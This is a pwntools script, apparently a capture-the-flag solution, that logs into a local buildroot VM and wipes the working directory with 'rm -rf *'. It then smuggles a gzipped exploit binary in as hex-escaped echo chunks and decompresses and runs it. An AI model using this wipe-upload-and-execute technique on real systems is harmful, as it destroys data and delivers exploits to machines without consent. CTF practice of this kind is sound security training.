#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

import os

def send_cmd(cmd):
    try:
        r.sendlineafter("$", cmd)
    except:
        r.interactive()
def check(cur):
	ret = ""
	for c in cur:
		ret+="\\x{}".format(hex(ord(c))[2:].rjust(2,"0"))
	return ret

r = process(["sh","./run.sh"])
r.sendlineafter("buildroot login: ","ctf")
r.sendlineafter(":","asisctf")
send_cmd("rm -rf *")
log.success("prepare empty binary...")
b64 = open("./exp.gz", "rb").read() # pwn binary

now = 0
seg = 100
while now < len(b64):
    cur = b64[now:now+seg]
    cmd = "echo -ne \"{}\" >> exp.gz".format(check(cur))
    log.info("sending {} / {} ...".format(now+seg, len(b64)))
    send_cmd(cmd)
    now += seg

send_cmd("gzip -dkf exp.gz")
send_cmd("chmod +x exp")
send_cmd("./exp")
r.interactive()
